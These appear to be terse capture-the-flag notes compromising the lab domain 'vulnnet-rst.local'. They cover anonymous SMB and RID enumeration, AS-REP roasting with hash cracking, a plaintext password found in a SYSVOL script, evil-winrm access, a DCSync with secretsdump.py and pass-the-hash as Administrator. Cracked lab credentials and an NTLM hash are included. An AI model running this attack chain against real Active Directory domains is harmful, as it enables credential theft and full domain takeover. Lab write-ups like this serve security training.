### Enumeration
##### Anonymous SMB
__Usernames__
- Tony Skid
- Johnny Leet : 7331 0000 1337
- Jack Goldenhand
- Alexa Whitehat : 1337 0000 7331
- 
__Rid Bruteforce__
```bash
 crackmapexec smb $IP -u "x" -p "" --rid-brute
```

```txt
a-whitehat
t-skid
j-goldenhand
j-leet
```

##### AS-Rep Roasting
```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip $IP -usersfile users.txt
```

```bash
hashcat -m 18200 -a 0 hashes.txt ~/git/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --force -O
```
__password__
t-skid
```txt
tj072889*
```

##### SMB Enum w/ creds

__SYSVOL -> ResetPassword.vbs__
```txt
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```
##### Evil-winrm 2.4
```bash
evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i $IP
```

##### DCSync
```bash
secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$IP
```
##### Pass the Hash
```bash
evil-winrm -u "Administrator" -H "c2597747aa5e43022a3a3049a3c3b09d" -i $IP 
```